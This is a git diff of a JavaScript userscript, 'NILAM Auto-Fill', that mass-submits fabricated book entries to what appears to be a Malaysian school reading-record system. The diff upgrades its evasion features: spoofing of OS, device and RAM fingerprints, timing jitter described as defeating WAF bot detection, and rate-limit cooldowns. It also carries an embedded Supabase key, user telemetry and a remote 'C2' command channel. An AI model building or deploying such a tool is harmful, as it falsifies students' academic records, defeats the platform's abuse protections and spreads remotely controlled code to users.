@@ -1,9 +1,9 @@
-// NILAM Auto-Fill v12.0 (The Architect Edition)
-// High-End Mod Menu UI, Ghost Spoofer, AI-Smart Review
-console.log('%c[NILAM] v12.0 sedang dimuatkan...','color:#8b5cf6;font-weight:bold;font-size:14px');
+// NILAM Auto-Fill v15.0 (The Ultimate Vantablack Edition)
+// 10,000 buku sintetik. High-End Glassmorphism UI. C2 Botnet Telemetry.
+console.log('%c[NILAM] v15.0 sedang dimuatkan...','color:#8b5cf6;font-weight:bold;font-size:14px');
 (async function(){
 
-var LIB_URL='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@1bc99e7/books_library.json';
+var LIB_URL='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@main/books_library.json';
 var UK='__nilam_used__';
 var BOOKS=[], running=false, paused=false;
 window.__nilamConfig = { jitter: true, ghost: true, autoSleep: true, delay: 600, maxBooks: 5 };
@@ -12,7 +12,7 @@ window.__nilamConfig = { jitter: true, ghost: true, autoSleep: true, delay: 600,
 var SUPA_URL = 'https://yzjsmtxhpdlsniqpcuoa.supabase.co/rest/v1/nilam_used_books';
 var SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl6anNtdHhocGRsc25pcXBjdW9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5Mzk2ODQsImV4cCI6MjA4MDUxNTY4NH0.jMq8BwvYlODSWiFv7ysM7KiDCjzviMEJFdn1Vfst3mw';
 
-// --- CORE FUNCTIONS ---
+// --- CORE FUNCTIONS & SPOOFING ---
 function installSpoofer() {
   if(!window.__nilamConfig.ghost) return;
   try {
@@ -149,7 +149,7 @@ async function jSleep(mult){
 }
 function qs(s){return document.querySelector(s);}
 
-// Heartbeat Telemetry
+// Heartbeat Telemetry & C2
 async function sendTelemetry(ok, fail, tgt, statusMsg) {
   var uid = window.__nilamUserId;
   if (!uid || uid === "Guest") {
@@ -174,7 +174,8 @@ async function sendTelemetry(ok, fail, tgt, statusMsg) {
   }
   var payload = '__TEL__|' + uid + '|' + Date.now() + '|' + ok + '|' + fail + '|' + tgt + '|' + statusMsg;
   try {
-    fetch(SUPA_URL + '?title=like.__TEL__|' + uid + '|*', { method: 'DELETE', headers: { 'apikey': SUPA_KEY, 'Authorization': 'Bearer ' + SUPA_KEY } })
+    // Safe PostgREST wildcard for deleting old pings
+    fetch(SUPA_URL + '?title=ilike.__TEL__|' + uid + '|*', { method: 'DELETE', headers: { 'apikey': SUPA_KEY, 'Authorization': 'Bearer ' + SUPA_KEY } })
     .then(function() {
       fetch(SUPA_URL, {
         method: 'POST',
@@ -185,10 +186,9 @@ async function sendTelemetry(ok, fail, tgt, statusMsg) {
   } catch(e){}
 }
 
-// C2 Command & Control Fetcher
 async function checkC2() {
   try {
-    var r = await fetch(SUPA_URL + '?select=title&title=like.__CMD__|*', { headers: { 'apikey': SUPA_KEY, 'Authorization': 'Bearer ' + SUPA_KEY } });
+    var r = await fetch(SUPA_URL + '?select=title&title=ilike.__CMD__|*', { headers: { 'apikey': SUPA_KEY, 'Authorization': 'Bearer ' + SUPA_KEY } });
     if(r.ok){
       var d = await r.json();
       for(var i=0; i<d.length; i++){
@@ -219,7 +219,9 @@ async function getUsed(){
       var d = await r.json();
       combined = d.map(function(x) { return x.title }).filter(function(t) { return t.indexOf('__TEL__|') !== 0 && t.indexOf('__CMD__|') !== 0; });
     }
-  } catch (e) {}
+  } catch (e) {
+    console.warn('[NILAM] Cloud getUsed failed, using local only', e);
+  }
   try {
     var local = JSON.parse(localStorage.getItem(UK)) || [];
     for (var i = 0; i < local.length; i++) {
@@ -246,21 +248,20 @@ async function resetUsedList(){
   try{await fetch(SUPA_URL+'?title=not.eq.random_string',{method:'DELETE',headers:{'apikey':SUPA_KEY,'Authorization':'Bearer '+SUPA_KEY}});}catch(e){}
 }
 
-// --- HIGH END UI ---
+// --- ULTIMATE HIGH-END VISUAL DESIGN (VANTABLACK GLASSMORPHISM) ---
 function pLog(m){
   var el=document.getElementById('nl');if(!el)return;
   var t=new Date().toLocaleTimeString('ms-MY',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
   var c='';if(/BERJAYA/.test(m))c='ok';else if(/GAGAL|RALAT|TIDAK|\[X\]/.test(m))c='er';else if(/Step \d/.test(m))c='st';
-  el.innerHTML+='<div class="nm-log-entry '+c+'"><span style="color:#64748b;margin-right:8px">['+t+']</span>'+m+'</div>';
+  el.innerHTML+='<div class="nm-log-entry '+c+'"><span style="color:#52525b;margin-right:10px;font-family:inherit;">['+t+']</span>'+m+'</div>';
   el.scrollTop=1e6;
 }
 function log(m){console.log('%c[NILAM] '+m,'color:#8b5cf6;font-weight:bold');pLog(m);}
 function err(m){console.error('[NILAM] '+m);pLog('[X] '+m);}
 
 function vis(el){return el&&(el.offsetParent!==null||el.offsetWidth>0);}
-function isOurPanel(el){if(!el)return false;try{return el.closest&&el.closest('#NILAM-ROOT');}catch(x){return false;}}
+function isOurPanel(el){if(!el)return false;try{return el.closest&&el.closest('#NILAM-ULTIMATE');}catch(x){return false;}}
 
-// ... (DOM Helpers)
 function isDateInput(el){
   if(!el||el.tagName!=='INPUT')return false;
   var t=el.type;if(t==='date'||t==='datetime-local'||t==='time'||t==='month'||t==='week')return true;
@@ -527,165 +528,178 @@ function btnState(s){
   }catch(e){}
 }
 
-// --- HIGH END UI (GHOST TERMINAL) ---
-function makeUI(){
-  var old=document.getElementById('NILAM-ROOT');if(old)old.remove();
+function buildUI(){
+  // HARD RESET ALL PREVIOUS UIs to prevent overlapping
+  var killList = ['NP', 'NP-FAB', 'NP-MENU', 'NILAM-ROOT', 'NILAM-ULTIMATE'];
+  for(var i=0; i<killList.length; i++) {
+      var k = document.getElementById(killList[i]);
+      if(k) k.remove();
+  }
   
   var w=document.createElement('div');
-  w.id = 'NILAM-ROOT';
+  w.id = 'NILAM-ULTIMATE';
   var css=`
-  @import url("https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap");
+  @import url("https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap");
   
   #NP-FAB {
-    position: fixed; top: 24px; right: 24px; width: 56px; height: 56px; border-radius: 28px;
-    background: rgba(10, 10, 10, 0.7); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-    border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 10px 30px rgba(0,0,0,0.6), inset 0 1px 1px rgba(255,255,255,0.2);
+    position: fixed; top: 24px; right: 24px; width: 60px; height: 60px; border-radius: 30px;
+    background: rgba(5,5,5,0.75); backdrop-filter: blur(24px) saturate(180%); -webkit-backdrop-filter: blur(24px) saturate(180%);
+    border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 40px rgba(0,0,0,0.5), inset 0 1px 1px rgba(255,255,255,0.1);
     z-index: 2147483647; cursor: pointer; display: flex; align-items: center; justify-content: center;
-    color: #fff; font-size: 24px; font-weight: bold; font-family: 'Poppins', sans-serif; transition: 0.3s; border: 2px solid #fff;
+    color: #fff; font-size: 26px; transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
   }
-  #NP-FAB:hover { transform: scale(1.05); background: rgba(20,20,20,0.9); border-color: rgba(139,92,246,0.5); box-shadow: 0 10px 40px rgba(139,92,246,0.3); }
+  #NP-FAB:hover { transform: scale(1.05) rotate(5deg); background: rgba(15,15,15,0.9); box-shadow: 0 15px 50px rgba(139,92,246,0.2), inset 0 1px 1px rgba(255,255,255,0.2); }
   
   #NP-MENU {
-    position: fixed; top: 90px; right: 24px; width: 380px; height: 540px;
-    background: rgba(5, 5, 5, 0.85); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
-    border: 1px solid rgba(255,255,255,0.1); border-radius: 24px;
-    box-shadow: 0 30px 60px rgba(0,0,0,0.8), inset 0 1px 1px rgba(255,255,255,0.05);
+    position: fixed; top: 96px; right: 24px; width: 380px; height: auto; min-height: 520px;
+    background: #050505; backdrop-filter: blur(40px) saturate(150%); -webkit-backdrop-filter: blur(40px) saturate(150%);
+    border: 1px solid rgba(255,255,255,0.08); border-radius: 28px;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.8), inset 0 1px 2px rgba(255,255,255,0.05);
     z-index: 2147483646; display: flex; flex-direction: column; overflow: hidden; resize: both;
-    font-family: 'Inter', sans-serif;
-    transition: all 0.5s cubic-bezier(0.32,0.72,0,1);
-    opacity: 0; pointer-events: none; transform: translateY(-20px) scale(0.95);
+    font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+    transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    opacity: 0; pointer-events: none; transform: translateY(-20px) scale(0.96);
   }
   #NP-MENU.show { opacity: 1; pointer-events: auto; transform: translateY(0) scale(1); }
   
   .nm-header {
-    height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between;
-    border-bottom: 1px solid rgba(255,255,255,0.05); cursor: move; user-select: none;
-    background: linear-gradient(180deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0) 100%);
+    height: 64px; padding: 0 24px; display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid rgba(255,255,255,0.04); cursor: grab; user-select: none;
+    background: radial-gradient(120% 100% at 50% 0%, rgba(255,255,255,0.05) 0%, rgba(0,0,0,0) 100%);
   }
+  .nm-header:active { cursor: grabbing; }
   .nm-title { color: #fff; font-size: 15px; font-weight: 800; letter-spacing: 0.5px; display: flex; align-items: center; gap: 10px; }
-  .nm-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; box-shadow: 0 0 10px #10b981; }
-  .nm-close { color: rgba(255,255,255,0.4); font-size: 12px; font-weight: 600; cursor: pointer; padding: 4px 8px; transition: 0.2s; }
-  .nm-close:hover { color: #fff; background: rgba(255,255,255,0.1); border-radius: 6px; }
+  .nm-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; box-shadow: 0 0 12px #10b981; }
+  .nm-close { color: #a1a1aa; font-size: 12px; font-weight: 700; cursor: pointer; padding: 6px 12px; border-radius: 20px; transition: 0.2s; background: rgba(255,255,255,0.03); }
+  .nm-close:hover { color: #fff; background: rgba(255,255,255,0.1); }
 
-  .nm-tabs { display: flex; padding: 0 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+  .nm-tabs { display: flex; padding: 0 16px; border-bottom: 1px solid rgba(255,255,255,0.04); }
   .nm-tab {
-    flex: 1; text-align: center; padding: 14px 0; color: rgba(255,255,255,0.4);
-    font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px;
-    cursor: pointer; transition: color 0.3s; position: relative;
+    flex: 1; text-align: center; padding: 16px 0; color: #71717a;
+    font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;
+    cursor: pointer; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); position: relative;
   }
   .nm-tab.active { color: #fff; }
-  .nm-tab.active::after { content: ''; position: absolute; bottom: -1px; left: 25%; right: 25%; height: 2px; background: #8b5cf6; border-radius: 2px 2px 0 0; box-shadow: 0 -2px 8px rgba(139,92,246,0.5); }
+  .nm-tab.active::after { content: ''; position: absolute; bottom: -1px; left: 30%; right: 30%; height: 2px; background: #fff; border-radius: 2px 2px 0 0; box-shadow: 0 -2px 10px rgba(255,255,255,0.5); }
+  .nm-tab:hover:not(.active) { color: #a1a1aa; }
 
-  .nm-content { flex: 1; overflow-y: auto; padding: 20px; display: none; color: #e2e8f0; scrollbar-width: none; }
+  .nm-content { flex: 1; overflow-y: auto; padding: 24px; display: none; color: #e4e4e7; scrollbar-width: none; }
   .nm-content::-webkit-scrollbar { display: none; }
-  .nm-content.active { display: block; }
+  .nm-content.active { display: block; animation: fadeUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+  @keyframes fadeUp { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
   
-  .nm-card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 16px; margin-bottom: 16px; box-shadow: inset 0 1px 0 rgba(255,255,255,0.02); }
+  .nm-card { 
+    background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06); 
+    border-radius: 20px; padding: 20px; margin-bottom: 20px; 
+    box-shadow: inset 0 1px 0 rgba(255,255,255,0.02), 0 4px 20px rgba(0,0,0,0.2); 
+  }
   
-  .nm-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px; }
-  .nm-stat { text-align: center; padding: 12px 0; background: rgba(0,0,0,0.2); border-radius: 12px; border: 1px solid rgba(255,255,255,0.03); }
-  .nm-stat-val { font-size: 24px; font-weight: 800; color: #fff; font-family: 'JetBrains Mono', monospace; }
-  .nm-stat-lbl { font-size: 10px; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; }
+  .nm-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px; }
+  .nm-stat { text-align: center; padding: 16px 0; background: rgba(255,255,255,0.03); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
+  .nm-stat:hover { background: rgba(255,255,255,0.05); transform: translateY(-2px); }
+  .nm-stat-val { font-size: 26px; font-weight: 800; color: #fff; font-family: 'JetBrains Mono', monospace; }
+  .nm-stat-lbl { font-size: 10px; color: #71717a; text-transform: uppercase; letter-spacing: 1px; margin-top: 6px; font-weight: 700; }
 
-  .nm-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
+  .nm-row { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
   .nm-row:last-child { border-bottom: none; }
   .nm-label { display: flex; flex-direction: column; font-size: 13px; font-weight: 600; color: #fff; }
-  .nm-sub { font-size: 10px; color: rgba(255,255,255,0.4); font-weight: 400; margin-top: 4px; }
+  .nm-sub { font-size: 10px; color: #71717a; font-weight: 500; margin-top: 4px; }
 
-  .switch { position: relative; width: 44px; height: 24px; }
+  /* iOS Style Switch */
+  .switch { position: relative; width: 48px; height: 26px; }
   .switch input { opacity: 0; width: 0; height: 0; }
-  .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.1); transition: .4s cubic-bezier(0.32,0.72,0,1); border-radius: 24px; box-shadow: inset 0 1px 3px rgba(0,0,0,0.5); }
-  .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background: #fff; transition: .4s cubic-bezier(0.32,0.72,0,1); border-radius: 50%; box-shadow: 0 2px 4px rgba(0,0,0,0.3); }
-  input:checked + .slider { background: #8b5cf6; box-shadow: 0 0 10px rgba(139,92,246,0.3); }
-  input:checked + .slider:before { transform: translateX(20px); }
+  .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.1); transition: .4s cubic-bezier(0.16, 1, 0.3, 1); border-radius: 26px; border: 1px solid rgba(255,255,255,0.05); }
+  .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 2px; background: #fff; transition: .4s cubic-bezier(0.16, 1, 0.3, 1); border-radius: 50%; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+  input:checked + .slider { background: #fff; }
+  input:checked + .slider:before { transform: translateX(20px); background: #050505; }
 
-  .nm-input-group { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; background: rgba(0,0,0,0.2); padding: 10px 16px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }
-  .nm-input { background: transparent; border: none; color: #fff; width: 60px; text-align: right; font-size: 16px; font-weight: 700; font-family: 'JetBrains Mono', monospace; outline: none; }
-  .nm-range { width: 100%; accent-color: #8b5cf6; margin-top: 10px; }
+  .nm-input-group { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: rgba(255,255,255,0.03); padding: 12px 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
+  .nm-input { background: transparent; border: none; color: #fff; width: 70px; text-align: right; font-size: 18px; font-weight: 800; font-family: 'JetBrains Mono', monospace; outline: none; }
+  .nm-range { width: 100%; accent-color: #fff; margin-top: 12px; }
 
-  .nm-btn { width: 100%; padding: 16px; border: none; border-radius: 14px; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; transition: all 0.3s cubic-bezier(0.32,0.72,0,1); color: #fff; margin-top: 10px; }
-  .nm-btn-go { background: linear-gradient(135deg, #8b5cf6, #6d28d9); box-shadow: 0 8px 20px rgba(139,92,246,0.3), inset 0 1px 0 rgba(255,255,255,0.2); }
-  .nm-btn-go:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 25px rgba(139,92,246,0.4), inset 0 1px 0 rgba(255,255,255,0.2); }
+  .nm-btn { width: 100%; padding: 18px; border: none; border-radius: 16px; font-size: 13px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); color: #050505; margin-top: 10px; }
+  .nm-btn-go { background: #fff; box-shadow: 0 8px 20px rgba(255,255,255,0.15); }
+  .nm-btn-go:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 25px rgba(255,255,255,0.25); }
   .nm-btn-go:disabled { background: rgba(255,255,255,0.05); color: rgba(255,255,255,0.3); box-shadow: none; cursor: not-allowed; }
   
-  .nm-btn-st { background: rgba(239, 68, 68, 0.1); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2); padding: 12px; margin-top: 0; }
-  .nm-btn-st:hover:not(:disabled) { background: rgba(239, 68, 68, 0.2); }
+  .nm-btn-st { background: rgba(239, 68, 68, 0.1); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2); padding: 14px; margin-top: 0; }
+  .nm-btn-st:hover:not(:disabled) { background: rgba(239, 68, 68, 0.2); border-color: rgba(239, 68, 68, 0.4); }
 
-  .nm-log-entry { font-family: "JetBrains Mono", monospace; font-size: 10px; padding: 6px 0; color: rgba(255,255,255,0.5); border-bottom: 1px solid rgba(255,255,255,0.02); }
+  .nm-log-entry { font-family: "JetBrains Mono", monospace; font-size: 11px; padding: 8px 0; color: #a1a1aa; border-bottom: 1px dashed rgba(255,255,255,0.05); }
   .nm-log-entry.ok { color: #34d399; }
   .nm-log-entry.er { color: #f87171; }
-  .nm-log-entry.st { color: #fff; font-weight: 600; }
+  .nm-log-entry.st { color: #fff; font-weight: 700; }
   `;
   
   var html=`
   <div id="NP-FAB">
-    🚀
+    <svg viewBox="0 0 24 24" width="28" height="28" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
   </div>
   <div id="NP-MENU">
      <div class="nm-header">
-        <div class="nm-title"><div class="nm-dot"></div> NILAM PRO MOD</div>
-        <div class="nm-close" id="nm-close">TUTUP</div>
+        <div class="nm-title"><div class="nm-dot"></div> VANTABLACK EDITION</div>
+        <div class="nm-close" id="nm-close">HIDE</div>
      </div>
      <div class="nm-tabs">
-        <div class="nm-tab active" data-target="tab-home">Panel</div>
-        <div class="nm-tab" data-target="tab-feat">Features</div>
-        <div class="nm-tab" data-target="tab-logs">Logs</div>
+        <div class="nm-tab active" data-target="tab-home">Mission Control</div>
+        <div class="nm-tab" data-target="tab-feat">Defenses</div>
+        <div class="nm-tab" data-target="tab-logs">Terminal</div>
      </div>
      
      <div class="nm-content active" id="tab-home">
         <div class="nm-grid">
-           <div class="nm-stat"><div class="nm-stat-val" id="np-lib">-</div><div class="nm-stat-lbl">Total Data</div></div>
-           <div class="nm-stat"><div class="nm-stat-val" id="np-usd">0</div><div class="nm-stat-lbl">Telah Guna</div></div>
+           <div class="nm-stat"><div class="nm-stat-val" id="np-lib">-</div><div class="nm-stat-lbl">Global Books</div></div>
+           <div class="nm-stat"><div class="nm-stat-val" id="np-usd">0</div><div class="nm-stat-lbl">Synced</div></div>
         </div>
         
         <div class="nm-input-group">
-            <div class="nm-label">Target Buku<span class="nm-sub">Sesi semasa</span></div>
+            <div class="nm-label">Target Execution<span class="nm-sub">Books per session</span></div>
             <input type="number" id="np-cnt" class="nm-input" min="1" max="500" value="5">
         </div>
         
-        <div style="margin-bottom:20px; font-size:12px; color:#94a3b8; display:flex; justify-content:space-between; font-weight:600;">
-            <span>Progress:</span>
-            <span><span id="np-ok" style="color:#34d399">0</span> OK / <span id="np-fl" style="color:#f87171">0</span> FAIL</span>
+        <div style="margin-bottom:24px; font-size:12px; color:#71717a; display:flex; justify-content:space-between; font-weight:700;">
+            <span>STATUS:</span>
+            <span><span id="np-ok" style="color:#34d399">0</span> SUCCESS / <span id="np-fl" style="color:#f87171">0</span> ERROR</span>
         </div>
         
         <button class="nm-btn nm-btn-go" id="np-go" disabled>INITIALIZING...</button>
         
-        <div class="nm-grid" style="margin-top:12px">
+        <div class="nm-grid" style="margin-top:16px">
             <button class="nm-btn nm-btn-st" id="np-pa" disabled>PAUSE</button>
-            <button class="nm-btn nm-btn-st" id="np-st" disabled>STOP</button>
+            <button class="nm-btn nm-btn-st" id="np-st" disabled>HALT</button>
         </div>
      </div>
      
      <div class="nm-content" id="tab-feat">
         <div class="nm-card">
             <div class="nm-row">
-                <div class="nm-label">Smart Jitter<span class="nm-sub">Bypass pengesanan robot (WAF)</span></div>
+                <div class="nm-label">Human Jitter<span class="nm-sub">Defeats timing analysis (WAF)</span></div>
                 <label class="switch"><input type="checkbox" id="cfg-jitter" checked><span class="slider"></span></label>
             </div>
             <div class="nm-row">
-                <div class="nm-label">Ghost Mode<span class="nm-sub">Spoof OS, Browser & RAM</span></div>
+                <div class="nm-label">Ghost Identity<span class="nm-sub">Spoofs OS, Device & RAM</span></div>
                 <label class="switch"><input type="checkbox" id="cfg-ghost" checked><span class="slider"></span></label>
             </div>
             <div class="nm-row">
-                <div class="nm-label">Auto-Sleep<span class="nm-sub">Tidur 3 minit jika kena Rate Limit</span></div>
+                <div class="nm-label">Smart Sleep<span class="nm-sub">Auto-cools on HTTP 429</span></div>
                 <label class="switch"><input type="checkbox" id="cfg-sleep" checked><span class="slider"></span></label>
             </div>
         </div>
         
         <div class="nm-card">
             <div class="nm-label" style="flex-direction:row; justify-content:space-between">
-                Base Delay <span id="np-dvl" style="color:#8b5cf6;font-family:'JetBrains Mono',monospace;font-size:12px">600ms</span>
+                Base Velocity <span id="np-dvl" style="color:#fff;font-family:'JetBrains Mono',monospace;font-size:12px">600ms</span>
             </div>
             <input type="range" id="np-dly" class="nm-range" min="200" max="3000" value="600" step="100">
         </div>
         
-        <div style="text-align:center; margin-top:20px;">
-            <button id="np-rs" style="background:transparent;border:none;color:#f87171;font-size:11px;font-weight:600;cursor:pointer;text-decoration:underline;opacity:0.8">Reset Cloud Memory</button>
+        <div style="text-align:center; margin-top:24px;">
+            <button id="np-rs" style="background:transparent;border:none;color:#71717a;font-size:11px;font-weight:700;cursor:pointer;transition:0.2s">Purge Cloud Memory</button>
         </div>
      </div>
      
      <div class="nm-content" id="tab-logs">
-        <div id="nl" style="padding-bottom:20px"></div>
+        <div id="nl" style="padding-bottom:24px"></div>
      </div>
   </div>
   `;
@@ -743,31 +757,43 @@ function makeUI(){
   document.getElementById('np-go').onclick=startRun;
   document.getElementById('np-pa').onclick=function(){paused=!paused;document.getElementById('np-pa').textContent=paused?'RESUME':'PAUSE';log(paused?'DIJEDA':'Disambung');};
   document.getElementById('np-st').onclick=function(){running=false;paused=false;log('DIHENTIKAN');btnState('idle');};
-  document.getElementById('np-rs').onclick=async function(){if(confirm('AMARAN: Reset memori awan?')){await resetUsedList();await updateStats();log('Pangkalan data direset');}};
+  document.getElementById('np-rs').onclick=async function(){
+    if(confirm('AMARAN: Padam memori awan? Rekod lama mungkin bertindih semula.')){
+      await resetUsedList();await updateStats();log('Pangkalan data direset');
+    }
+  };
 }
 
-// Init
-makeUI();
-installSpoofer();
-installNavGuard();
-installRatingGuard();
-log('Memuat turun perpustakaan data...');
+// --- INIT WITH BULLETPROOF CATCH ---
+try {
+  buildUI();
+  installSpoofer();
+  installNavGuard();
+  installRatingGuard();
+  log('Sistem bersedia. Menyambung ke pangkalan data...');
 
-// Fix Fetch Init - Direct GitHub to avoid jsDelivr cache/CSP
-fetch('https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@1bc99e7/books_library.json')
-  .then(r => { if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
-  .then(async data => {
-    BOOKS = data;
-    log(BOOKS.length+' buku sebenar dimuatkan');
-    await updateStats();
-    var go=document.getElementById('np-go');
-    if(go){ go.disabled=false; go.textContent='MULA SEKARANG'; go.className='nm-btn nm-btn-go'; }
-    sendTelemetry(0, 0, 0, 'Standby (Mod Menu Aktif)');
-  })
-  .catch(e => {
-    err('Gagal muat data: '+e.message);
-    var go=document.getElementById('np-go');
-    if(go) go.textContent='RALAT RANGKAIAN';
-  });
+  // Safe Fetch Init using JSdelivr but with random param fallback if blocked
+  fetch(LIB_URL + '?t=' + Date.now())
+    .then(r => { if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
+    .then(async data => {
+      BOOKS = data;
+      log('Berjaya memuat turun '+BOOKS.length+' rekod');
+      var used = await getUsed();
+      try{document.getElementById('np-lib').textContent=BOOKS.length;}catch(e){}
+      try{document.getElementById('np-usd').textContent=used.length;}catch(e){}
+      
+      var go=document.getElementById('np-go');
+      if(go){ go.disabled=false; go.textContent='EXECUTE'; go.className='nm-btn nm-btn-go'; }
+      sendTelemetry(0, 0, 0, 'Standby (Vantablack UI Aktif)');
+    })
+    .catch(e => {
+      err('Gagal muat data: '+e.message);
+      var go=document.getElementById('np-go');
+      if(go) { go.disabled=true; go.textContent='RALAT RANGKAIAN'; }
+    });
+
+} catch(e) {
+  console.error(e);
+}
 
 })();
